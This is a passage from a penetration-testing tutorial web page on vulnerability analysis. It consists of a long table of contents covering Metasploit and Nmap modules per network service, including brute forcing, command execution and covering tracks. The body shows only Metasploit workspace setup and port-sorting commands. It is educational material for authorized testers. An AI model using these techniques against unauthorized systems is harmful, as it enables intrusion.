

<!doctype html>


<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <script type="text/javascript">

      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-92365403-1']);
      _gaq.push(['_trackPageview']);

      (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
      })();
    </script>
    <title>Infrastruture PenTest Series : Part 2 - Vulnerability Analysis &#8212; tech.bitvijays.com</title>
    
    <link rel="stylesheet" href="_static/bizstyle.css" type="text/css" />
    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
    
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    './',
        VERSION:     '0.1',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true
      };
    </script>
    <script type="text/javascript" src="_static/jquery.js"></script>
    <script type="text/javascript" src="_static/underscore.js"></script>
    <script type="text/javascript" src="_static/doctools.js"></script>
    <script type="text/javascript" src="_static/disqus.js"></script>
    <script type="text/javascript" src="_static/bizstyle.js"></script>
    <link rel="search" title="Search" href="search.html" />
    <link rel="top" title="tech.bitvijays.com" href="index.html" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!--[if lt IE 9]>
    <script type="text/javascript" src="_static/css3-mediaqueries.js"></script>
    <![endif]-->
  </head>
  <body role="document">
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
  <h3><a href="index.html">Table Of Contents</a></h3>
  <ul>
<li><a class="reference internal" href="#">Infrastruture PenTest Series : Part 2 - Vulnerability Analysis</a><ul>
<li><a class="reference internal" href="#ftp-port-21">FTP - Port 21</a><ul>
<li><a class="reference internal" href="#metasploit">Metasploit</a><ul>
<li><a class="reference internal" href="#ftp-version-scanner">FTP Version Scanner</a></li>
<li><a class="reference internal" href="#anonymous-ftp-access-detection">Anonymous FTP Access Detection</a></li>
<li><a class="reference internal" href="#ftp-authentication-scanner">FTP Authentication Scanner</a></li>
<li><a class="reference internal" href="#ftp-bounce-port-scanner">FTP Bounce Port Scanner</a></li>
</ul>
</li>
<li><a class="reference internal" href="#nmap">Nmap</a><ul>
<li><a class="reference internal" href="#ftp-anon">ftp-anon</a></li>
<li><a class="reference internal" href="#ftp-brute">ftp-brute</a></li>
<li><a class="reference internal" href="#ftp-bounce">ftp-bounce</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#ssh-port-22">SSH - Port 22</a><ul>
<li><a class="reference internal" href="#id1">Metasploit</a><ul>
<li><a class="reference internal" href="#ssh-version-scanner">SSH Version Scanner</a></li>
<li><a class="reference internal" href="#ssh-brute-force">SSH Brute force</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id2">Nmap</a><ul>
<li><a class="reference internal" href="#ssh2-enum-algos">ssh2-enum-algos</a></li>
<li><a class="reference internal" href="#ssh-hostkey">SSH-Hostkey</a></li>
<li><a class="reference internal" href="#sshv1">SSHv1</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#telnet-port-23">Telnet - Port 23</a><ul>
<li><a class="reference internal" href="#id3">Metasploit</a><ul>
<li><a class="reference internal" href="#telnet-version">Telnet version</a></li>
<li><a class="reference internal" href="#telnet-login-check-scanner">Telnet Login Check Scanner</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id4">Nmap</a><ul>
<li><a class="reference internal" href="#telnet-brute">Telnet-brute</a></li>
<li><a class="reference internal" href="#telnet-encryption">Telnet-encryption</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#smtp-port-25-and-submission-port-587">SMTP | Port 25 and Submission Port 587</a><ul>
<li><a class="reference internal" href="#id5">Metasploit</a><ul>
<li><a class="reference internal" href="#smtp-version">SMTP_Version</a></li>
<li><a class="reference internal" href="#smtp-open-relays">SMTP Open Relays</a></li>
<li><a class="reference internal" href="#smtp-user-enumeration-utility">SMTP User Enumeration Utility</a></li>
</ul>
</li>
<li><a class="reference internal" href="#nmap-nse">Nmap NSE</a><ul>
<li><a class="reference internal" href="#smtp-brute">SMTP-brute</a></li>
<li><a class="reference internal" href="#smtp-commands">SMTP-Commands</a></li>
<li><a class="reference internal" href="#smtp-enum-users">SMTP-enum-users</a></li>
<li><a class="reference internal" href="#smtp-open-relay">SMTP-open-relay</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#dns-port-53">DNS - Port 53</a><ul>
<li><a class="reference internal" href="#id6">Metasploit</a><ul>
<li><a class="reference internal" href="#dns-bruteforce-enumeration">DNS Bruteforce Enumeration</a></li>
<li><a class="reference internal" href="#dns-basic-information-enumeration">DNS Basic Information Enumeration</a></li>
<li><a class="reference internal" href="#dns-reverse-lookup-enumeration">DNS Reverse Lookup Enumeration</a></li>
<li><a class="reference internal" href="#dns-common-service-record-enumeration">DNS Common Service Record Enumeration</a></li>
<li><a class="reference internal" href="#dns-record-scanner-and-enumerator">DNS Record Scanner and Enumerator</a></li>
<li><a class="reference internal" href="#dns-amplification-scanner">DNS Amplification Scanner</a></li>
<li><a class="reference internal" href="#dns-non-recursive-record-scraper">DNS Non-Recursive Record Scraper</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id7">Nmap</a><ul>
<li><a class="reference internal" href="#broadcast-dns-service-discovery">Broadcast-dns-service-discovery</a></li>
<li><a class="reference internal" href="#dns-blacklist">DNS-blacklist</a></li>
<li><a class="reference internal" href="#dns-brute">DNS-brute</a></li>
<li><a class="reference internal" href="#dns-cache-snoop">DNS-Cache-snoop</a></li>
<li><a class="reference internal" href="#dns-check-zone">DNS-Check-zone</a></li>
<li><a class="reference internal" href="#dns-nsid">DNS-nsid</a></li>
<li><a class="reference internal" href="#dns-recursion">DNS-recursion</a></li>
<li><a class="reference internal" href="#dns-service-discovery">DNS-Service-Discovery</a></li>
<li><a class="reference internal" href="#dns-srv-enum">DNS-SRV-Enum</a></li>
<li><a class="reference internal" href="#dns-zone-transfer">DNS-Zone-Transfer</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#finger-port-79">Finger - Port 79</a><ul>
<li><a class="reference internal" href="#id8">Metasploit</a><ul>
<li><a class="reference internal" href="#finger-service-user-enumerator">Finger Service User Enumerator</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id9">Nmap</a><ul>
<li><a class="reference internal" href="#finger">Finger</a></li>
</ul>
</li>
<li><a class="reference internal" href="#other">Other</a><ul>
<li><a class="reference internal" href="#id10">finger</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#http">HTTP</a><ul>
<li><a class="reference internal" href="#webmin">Webmin</a><ul>
<li><a class="reference internal" href="#id11">Metasploit</a></li>
</ul>
</li>
<li><a class="reference internal" href="#jenkins">Jenkins</a><ul>
<li><a class="reference internal" href="#id12">Metasploit</a></li>
</ul>
</li>
<li><a class="reference internal" href="#apache-tomcat">Apache Tomcat</a></li>
</ul>
</li>
<li><a class="reference internal" href="#kerberos-port-88">Kerberos - Port 88</a><ul>
<li><a class="reference internal" href="#id13">Nmap</a><ul>
<li><a class="reference internal" href="#krb5-enum-users">krb5-enum-users</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#pop3-port-110">POP3 - Port 110</a><ul>
<li><a class="reference internal" href="#id14">Metasploit</a><ul>
<li><a class="reference internal" href="#pop3-banner-grabber">POP3 Banner Grabber</a></li>
<li><a class="reference internal" href="#pop3-login-utility">POP3 Login Utility</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id15">Nmap</a><ul>
<li><a class="reference internal" href="#pop3-capabilities">POP3-capabilities</a></li>
<li><a class="reference internal" href="#pop3-brute">POP3-brute</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#rpcinfo-port-111">RPCInfo - Port 111</a><ul>
<li><a class="reference internal" href="#id16">Metasploit</a><ul>
<li><a class="reference internal" href="#nfs-mount-scanner">NFS Mount Scanner</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id17">Other</a><ul>
<li><a class="reference internal" href="#rpcinfo">rpcinfo</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#ident-port-113">Ident - Port 113</a><ul>
<li><a class="reference internal" href="#id18">Nmap</a><ul>
<li><a class="reference internal" href="#auth-owners">Auth-owners</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id19">Other</a><ul>
<li><a class="reference internal" href="#ident-user-enum">Ident-user-enum</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#netbios">NetBios</a><ul>
<li><a class="reference internal" href="#id20">Nmap</a><ul>
<li><a class="reference internal" href="#broadcast-netbios-master-browser">broadcast-netbios-master-browser</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#snmp-port-161">SNMP - Port 161</a><ul>
<li><a class="reference internal" href="#id21">Metasploit</a><ul>
<li><a class="reference internal" href="#snmp-community-scanner">SNMP Community Scanner</a></li>
<li><a class="reference internal" href="#snmp-enumeration-module">SNMP Enumeration Module</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#check-point-firewall-1-topology-port-264">Check Point FireWall-1 Topology - Port 264</a><ul>
<li><a class="reference internal" href="#id22">Metasploit</a><ul>
<li><a class="reference internal" href="#checkpoint-firewall-1-securemote-topology-service-hostname-disclosure">CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#ldap-port-389">LDAP - Port 389</a><ul>
<li><a class="reference internal" href="#id23">Nmap</a><ul>
<li><a class="reference internal" href="#ldap-rootdse">LDAP-rootdse</a></li>
<li><a class="reference internal" href="#ldap-search">ldap-search</a></li>
<li><a class="reference internal" href="#ldap-brute">ldap-brute</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id24">Other</a><ul>
<li><a class="reference internal" href="#ldapsearch">ldapsearch</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#smb-port-445">SMB - Port 445</a><ul>
<li><a class="reference internal" href="#id25">Metasploit</a><ul>
<li><a class="reference internal" href="#smb-version-detection">SMB Version Detection</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#rexec-port-512">rexec - Port 512</a><ul>
<li><a class="reference internal" href="#id26">Metasploit</a><ul>
<li><a class="reference internal" href="#rexec-authentication-scanner">rexec Authentication Scanner</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id27">Other</a><ul>
<li><a class="reference internal" href="#rlogin">rlogin</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id28">Nmap</a><ul>
<li><a class="reference internal" href="#rexec-brute">rexec-brute</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#rlogin-port-513">rlogin - Port 513</a><ul>
<li><a class="reference internal" href="#id29">Metasploit</a><ul>
<li><a class="reference internal" href="#rlogin-authentication-scanner">rlogin Authentication Scanner</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#rsh-port-514">RSH - port 514</a><ul>
<li><a class="reference internal" href="#id30">Metasploit</a><ul>
<li><a class="reference internal" href="#rsh-authentication-scanner">rsh Authentication Scanner</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id31">Other</a><ul>
<li><a class="reference internal" href="#rsh">rsh</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#afp-apple-filing-protocol-port-548">AFP - Apple Filing Protocol - Port 548</a><ul>
<li><a class="reference internal" href="#id32">Metasploit</a><ul>
<li><a class="reference internal" href="#apple-filing-protocol-info-enumerator">Apple Filing Protocol Info Enumerator</a></li>
<li><a class="reference internal" href="#apple-filing-protocol-login-utility">Apple Filing Protocol Login Utility</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id33">Nmap</a><ul>
<li><a class="reference internal" href="#afp-serverinfo">afp-serverinfo</a></li>
<li><a class="reference internal" href="#afp-brute">afp-brute</a></li>
<li><a class="reference internal" href="#afp-ls">afp-ls</a></li>
<li><a class="reference internal" href="#afp-showmount">afp-showmount</a></li>
<li><a class="reference internal" href="#afp-path-vuln">afp-path-vuln</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#microsoft-windows-rpc-services-port-135-and-microsoft-rpc-services-over-http-port-593">Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593</a><ul>
<li><a class="reference internal" href="#id34">Metasploit</a><ul>
<li><a class="reference internal" href="#endpoint-mapper-service-discovery">Endpoint Mapper Service Discovery</a></li>
<li><a class="reference internal" href="#hidden-dcerpc-service-discovery">Hidden DCERPC Service Discovery</a></li>
<li><a class="reference internal" href="#remote-management-interface-discovery">Remote Management Interface Discovery</a></li>
<li><a class="reference internal" href="#dcerpc-tcp-service-auditor">DCERPC TCP Service Auditor</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id35">Other</a><ul>
<li><a class="reference internal" href="#rpcdump">rpcdump</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#https-port-443-and-8443">HTTPS - Port 443 and 8443</a><ul>
<li><a class="reference internal" href="#id36">Metasploit</a><ul>
<li><a class="reference internal" href="#http-ssl-certificate-information">HTTP SSL Certificate Information</a></li>
<li><a class="reference internal" href="#http-ssl-tls-version-detection-poodle-scanner">HTTP SSL/TLS Version Detection (POODLE scanner)</a></li>
<li><a class="reference internal" href="#openssl-server-side-changecipherspec-injection-scanner">OpenSSL Server-Side ChangeCipherSpec Injection Scanner</a></li>
<li><a class="reference internal" href="#openssl-heartbeat-heartbleed-information-leak">OpenSSL Heartbeat (Heartbleed) Information Leak</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id37">Nmap</a><ul>
<li><a class="reference internal" href="#ssl-cert">ssl-cert</a></li>
<li><a class="reference internal" href="#ssl-dh-params">ssl-dh-params</a></li>
<li><a class="reference internal" href="#ssl-google-cert-catalog">ssl-google-cert-catalog</a></li>
<li><a class="reference internal" href="#sslv2">sslv2</a></li>
<li><a class="reference internal" href="#ssl-ccs-injection">ssl-ccs-injection</a></li>
<li><a class="reference internal" href="#ssl-date">ssl-date</a></li>
<li><a class="reference internal" href="#ssl-enum-ciphers">ssl-enum-ciphers</a></li>
<li><a class="reference internal" href="#ssl-heartbleed">ssl-heartbleed</a></li>
<li><a class="reference internal" href="#ssl-poodle">ssl-poodle</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#rtsp-port-554-and-8554">RTSP - Port 554 and 8554</a><ul>
<li><a class="reference internal" href="#id39">Nmap</a><ul>
<li><a class="reference internal" href="#rtsp-methods">rtsp-methods</a></li>
<li><a class="reference internal" href="#rtsp-url-brute">rtsp-url-brute</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#rsync-port-873">Rsync - Port 873</a><ul>
<li><a class="reference internal" href="#id40">Metasploit</a><ul>
<li><a class="reference internal" href="#list-rsync-modules">List Rsync Modules</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id41">Nmap</a><ul>
<li><a class="reference internal" href="#rsync-list-modules">rsync-list-modules</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id42">Other</a><ul>
<li><a class="reference internal" href="#rsync">rsync</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#java-rmi-port-1099">Java RMI - Port 1099</a><ul>
<li><a class="reference internal" href="#id43">Metasploit</a><ul>
<li><a class="reference internal" href="#java-rmi-server-insecure-endpoint-code-execution-scanner">Java RMI Server Insecure Endpoint Code Execution Scanner</a></li>
<li><a class="reference internal" href="#java-rmi-server-insecure-default-configuration-java-code-execution">Java RMI Server Insecure Default Configuration Java Code Execution</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id44">Nmap</a><ul>
<li><a class="reference internal" href="#rmi-vuln-classloader">rmi-vuln-classloader</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#ms-sql-port-1433">MS-SQL | Port 1433</a><ul>
<li><a class="reference internal" href="#id45">Metasploit</a><ul>
<li><a class="reference internal" href="#mssql-ping-utility">MSSQL Ping Utility</a></li>
<li><a class="reference internal" href="#mssql-login-utility">MSSQL Login Utility</a></li>
<li><a class="reference internal" href="#microsoft-sql-server-configuration-enumerator">Microsoft SQL Server Configuration Enumerator</a></li>
<li><a class="reference internal" href="#microsoft-sql-server-xp-cmdshell-command-execution">Microsoft SQL Server xp_cmdshell Command Execution</a></li>
<li><a class="reference internal" href="#microsoft-sql-server-suser-sname-windows-domain-account-enumeration">Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration</a></li>
<li><a class="reference internal" href="#microsoft-sql-server-find-and-sample-data">Microsoft SQL Server Find and Sample Data</a></li>
<li><a class="reference internal" href="#microsoft-sql-server-generic-query">Microsoft SQL Server Generic Query</a></li>
<li><a class="reference internal" href="#mssql-schema-dump">MSSQL Schema Dump</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id46">Other</a><ul>
<li><a class="reference internal" href="#tsql">tsql</a></li>
<li><a class="reference internal" href="#microsoft-sql-server-management">Microsoft SQL Server Management</a></li>
</ul>
</li>
<li><a class="reference internal" href="#reference-hacking-sql-server-stored-procedures">Reference - Hacking SQL Server Stored Procedures</a><ul>
<li><a class="reference internal" href="#part-1-un-trustworthy-databases">Part 1: (un)Trustworthy Databases</a></li>
<li><a class="reference internal" href="#part-2-user-impersonation">Part 2: User Impersonation</a></li>
<li><a class="reference internal" href="#part-3-sql-injection">Part 3: SQL Injection</a></li>
<li><a class="reference internal" href="#part-4-enumerating-domain-accounts">Part 4; Enumerating Domain Accounts</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#oracle-port-1521">Oracle - Port 1521</a><ul>
<li><a class="reference internal" href="#oracle-attack-methodology">Oracle Attack Methodology</a><ul>
<li><a class="reference internal" href="#locate-oracle-systems">Locate Oracle Systems</a></li>
<li><a class="reference internal" href="#determine-oracle-version">Determine Oracle Version</a></li>
<li><a class="reference internal" href="#determine-oracle-sid">Determine Oracle SID</a></li>
<li><a class="reference internal" href="#guess-bruteforce-user-pass">Guess/Bruteforce USER/PASS</a></li>
<li><a class="reference internal" href="#privilege-escalation-via-sql-injection">Privilege Escalation via SQL Injection</a></li>
<li><a class="reference internal" href="#manipulate-data-post-exploitation">Manipulate Data/Post Exploitation</a></li>
<li><a class="reference internal" href="#cover-tracks">Cover Tracks</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#nfs-port-2049">NFS - Port 2049</a></li>
<li><a class="reference internal" href="#iscsi-port-3260">ISCSI - Port 3260</a><ul>
<li><a class="reference internal" href="#id47">Nmap</a><ul>
<li><a class="reference internal" href="#iscsi-info">iscsi-info</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id48">Other</a><ul>
<li><a class="reference internal" href="#iscsiadm">iscsiadm</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#mysql-port-3306">MySQL | Port 3306</a><ul>
<li><a class="reference internal" href="#id50">Metasploit</a><ul>
<li><a class="reference internal" href="#mysql-server-version-enumeration">MySQL Server Version Enumeration</a></li>
<li><a class="reference internal" href="#mysql-login-utility">MySQL Login Utility</a></li>
<li><a class="reference internal" href="#mysql-password-hashdump">MYSQL Password Hashdump</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id51">Other</a><ul>
<li><a class="reference internal" href="#mysql">mysql</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#postgresql-port-5432">Postgresql - Port 5432</a><ul>
<li><a class="reference internal" href="#id52">Metasploit</a><ul>
<li><a class="reference internal" href="#postgresql-version-probe">PostgreSQL Version Probe</a></li>
<li><a class="reference internal" href="#postgresql-login-utility">PostgreSQL Login Utility</a></li>
<li><a class="reference internal" href="#postgresql-database-name-command-line-flag-injection">PostgreSQL Database Name Command Line Flag Injection</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#port-5555-hpdataprotector-rce">Port: 5555 HPDataProtector RCE</a></li>
<li><a class="reference internal" href="#vnc-port-5900">VNC - Port 5900</a><ul>
<li><a class="reference internal" href="#id53">Metasploit</a><ul>
<li><a class="reference internal" href="#vnc-authentication-none-detection">VNC Authentication None Detection</a></li>
<li><a class="reference internal" href="#vnc-authentication-scanner">VNC Authentication Scanner</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#x11-port-6000">X11 - Port 6000</a><ul>
<li><a class="reference internal" href="#id54">Metasploit</a><ul>
<li><a class="reference internal" href="#x11-no-auth-scanner">X11 No-Auth Scanner</a></li>
<li><a class="reference internal" href="#x11-keyboard-command-injection">X11 Keyboard Command Injection</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id55">Other</a><ul>
<li><a class="reference internal" href="#xspy">xspy</a></li>
<li><a class="reference internal" href="#xdpyinfo">xdpyinfo</a></li>
<li><a class="reference internal" href="#xwd">xwd</a></li>
<li><a class="reference internal" href="#xwininfo">xwininfo</a></li>
<li><a class="reference internal" href="#xwatchwin">XWatchwin</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#redis-port-6379">Redis - Port 6379</a><ul>
<li><a class="reference internal" href="#id57">Nmap</a></li>
<li><a class="reference internal" href="#id58">Metasploit</a></li>
<li><a class="reference internal" href="#id59">Other</a></li>
</ul>
</li>
<li><a class="reference internal" href="#pjl-port-9100">PJL - Port 9100</a><ul>
<li><a class="reference internal" href="#id60">Metasploit</a><ul>
<li><a class="reference internal" href="#printer-version-information-scanner">Printer Version Information Scanner</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id61">Nmap</a><ul>
<li><a class="reference internal" href="#pjl-ready-message">PJL-ready-message</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#apache-cassandra-port-9160">Apache Cassandra - Port 9160</a><ul>
<li><a class="reference internal" href="#id63">NMap</a><ul>
<li><a class="reference internal" href="#cassandra-info">Cassandra-info</a></li>
<li><a class="reference internal" href="#cassandra-brute">Cassandra-brute</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#network-data-management-protocol-ndmp-port-10000">Network Data Management Protocol (ndmp) - Port 10000</a><ul>
<li><a class="reference internal" href="#id65">Nmap</a><ul>
<li><a class="reference internal" href="#ndmp-fs-info">ndmp-fs-info</a></li>
<li><a class="reference internal" href="#ndmp-version">ndmp-version</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#memcache-port-11211">Memcache - Port 11211</a><ul>
<li><a class="reference internal" href="#id67">Nmap</a><ul>
<li><a class="reference internal" href="#memcached-info">memcached-info</a></li>
<li><a class="reference internal" href="#id69">Other</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#mongodb-port-27017-and-port-27018">MongoDB - Port 27017 and Port 27018</a><ul>
<li><a class="reference internal" href="#id70">Metasploit</a><ul>
<li><a class="reference internal" href="#mongodb-login-utility">MongoDB Login Utility</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id71">Nmap</a><ul>
<li><a class="reference internal" href="#mongodb-info">Mongodb-info</a></li>
<li><a class="reference internal" href="#mongodb-database">Mongodb-database</a></li>
<li><a class="reference internal" href="#mongodb-bruteforce">Mongodb-BruteForce</a></li>
</ul>
</li>
<li><a class="reference internal" href="#id72">Other</a></li>
</ul>
</li>
<li><a class="reference internal" href="#ethernetip-tcp-udp-port-44818">EthernetIP-TCP-UDP - Port 44818</a><ul>
<li><a class="reference internal" href="#id73">Nmap</a><ul>
<li><a class="reference internal" href="#enip-enumerate">enip-enumerate</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#udp-bacnet-port-47808">UDP BACNet - Port 47808</a><ul>
<li><a class="reference internal" href="#bacnet-discover-enumerate">BACNet-discover-enumerate</a></li>
</ul>
</li>
</ul>
</li>
</ul>

  <h3>This Page</h3>
  <ul class="this-page-menu">
    <li><a href="_sources/LFF-IPS-P2-VulnerabilityAnalysis.txt"
           rel="nofollow">Show Source</a></li>
    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/blob/master/docs/LFF-IPS-P2-VulnerabilityAnalysis.rst"
           rel="nofollow">Show on GitHub</a></li>
    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/edit/master/docs/LFF-IPS-P2-VulnerabilityAnalysis.rst"
           rel="nofollow">Edit on GitHub</a></li>
  </ul>
<div id="searchbox" style="display: none" role="search">
  <h3>Quick search</h3>
    <form class="search" action="search.html" method="get">
      <div><input type="text" name="q" /></div>
      <div><input type="submit" value="Go" /></div>
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
        </div>
      </div>

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="infrastruture-pentest-series-part-2-vulnerability-analysis">
<h1>Infrastruture PenTest Series : Part 2 - Vulnerability Analysis<a class="headerlink" href="#infrastruture-pentest-series-part-2-vulnerability-analysis" title="Permalink to this headline">¶</a></h1>
<p>So, by using <strong>intelligence gathering</strong> you have completed the normal scanning and banner grabbing. Yay!!. Now, it&#8217;s time for some <strong>metasploit-fu</strong> and <strong>nmap-fu</strong>. We would go thru almost every port / service and figure out what information can be retrieved from it and whether it can be exploited or not?</p>
<p>So we start with creating a new workspace in the msfconsole for better work.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msfconsole</span> <span class="o">-</span><span class="n">q</span> <span class="o">--</span> <span class="n">Starts</span> <span class="n">Metasploit</span> <span class="n">Console</span> <span class="n">quietly</span>
<span class="n">workspace</span> <span class="o">-</span><span class="n">a</span> <span class="o">&lt;</span><span class="n">Engagement_Name</span><span class="o">&gt;</span> <span class="o">--</span> <span class="n">Add</span> <span class="n">a</span> <span class="n">new</span> <span class="n">workspace</span> <span class="k">with</span> <span class="n">the</span> <span class="n">engagement</span> <span class="n">name</span> <span class="n">specified</span>
<span class="n">workspace</span> <span class="o">&lt;</span><span class="n">Engagement_Name</span><span class="o">&gt;</span> <span class="o">--</span> <span class="n">Switch</span> <span class="n">to</span> <span class="n">the</span> <span class="n">new</span> <span class="n">workspace</span>
</pre></div>
</div>
<p>Let&#8217;s import all the nmap xml file of different network ranges</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">db_import</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Project_Location</span><span class="o">/</span><span class="n">Engagement_Name</span><span class="o">/</span><span class="n">Internal</span><span class="o">/</span><span class="n">Site_10</span><span class="o">.*.*.</span><span class="mi">0</span><span class="n">_</span><span class="o">*/</span><span class="n">nmap_scans</span><span class="o">/</span><span class="n">Port_Scan</span><span class="o">/*.</span><span class="n">xml</span>
</pre></div>
</div>
<p>After all the importing, it&#8217;s important to check what all services/ports are running to get a feel of different possibilities.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">services</span> <span class="o">-</span><span class="n">c</span> <span class="n">port</span><span class="p">,</span><span class="n">name</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ports</span>
<span class="o">^</span> <span class="o">-</span><span class="n">u</span> <span class="ow">is</span> <span class="n">used</span> <span class="k">for</span> <span class="n">only</span> <span class="n">showing</span> <span class="n">ports</span> <span class="n">which</span> <span class="n">are</span> <span class="nb">open</span><span class="o">.</span>
</pre></div>
</div>
<p>This will write a file in /tmp/ports containing the port number and it&#8217;s name. info could also be used to get more information.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ports</span> <span class="o">|</span> <span class="n">cut</span> <span class="o">-</span><span class="n">d</span> <span class="p">,</span> <span class="o">-</span><span class="n">f2</span><span class="p">,</span><span class="mi">3</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">|</span> <span class="n">uniq</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> \<span class="s2">&quot; | grep -v -E &#39;port|tcpwrapped&#39; | sort -n</span>
</pre></div>
</div>
<p>This will provide you the sorted ports running on the network which can be then viewed to probe further.</p>
<p>A sample output is</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">***</span><span class="n">SNIP</span><span class="o">**</span>
<span class="mi">20</span><span class="p">,</span><span class="n">ftp</span><span class="o">-</span><span class="n">data</span>
<span class="mi">21</span><span class="p">,</span><span class="n">ftp</span>
<span class="mi">22</span><span class="p">,</span><span class="n">ssh</span>
<span class="mi">23</span><span class="p">,</span><span class="n">landesk</span><span class="o">-</span><span class="n">rc</span>
<span class="mi">23</span><span class="p">,</span><span class="n">telnet</span>
<span class="mi">24</span><span class="p">,</span><span class="n">priv</span><span class="o">-</span><span class="n">mail</span>
<span class="mi">25</span><span class="p">,</span><span class="n">smtp</span>
<span class="mi">25</span><span class="p">,</span><span class="n">smtp</span><span class="o">-</span><span class="n">proxy</span>
<span class="o">***</span><span class="n">SNIP</span><span class="o">**</span>
</pre></div>
</div>
<p>Let&#8217;s move <strong>port by port</strong> and check what metasploit framework and nmap nse has to offer. By no means, this is a complete list, new ports, metasploit modules, nmap nse will be added as used. This post currently covers the below ports / services.</p>
<ul class="simple">
